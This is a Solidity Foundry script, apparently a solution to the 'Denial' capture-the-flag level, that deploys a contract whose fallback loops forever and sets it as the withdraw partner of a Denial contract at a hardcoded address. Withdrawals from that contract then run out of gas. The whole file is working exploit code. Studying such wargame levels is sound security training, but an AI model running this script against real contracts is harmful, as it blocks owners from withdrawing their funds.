// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Script.sol";

contract AttackDenial is Script {
    function run() external {
        vm.startBroadcast();

        // Address of the Denial contract
        address denialAddress = 0xdfC8Df32c27B61C2536D35849cE193B629cbc8b9;

        // Deploy a new instance of the attack contract and use its address
        address newAttackContract = address(new AttackContract());

        console.log("New Attack Contract deployed at:", newAttackContract);

        // Set the partner address in the Denial contract
        (bool successPartner, ) = denialAddress.call(
            abi.encodeWithSignature(
                "setWithdrawPartner(address)",
                newAttackContract
            )
        );
        require(successPartner, "Setting partner failed!");

        // Stop broadcasting
        vm.stopBroadcast();
    }
}

contract AttackContract {
    fallback() external payable {
        // Infinite loop or other attack logic
        while (true) {}
    }
}
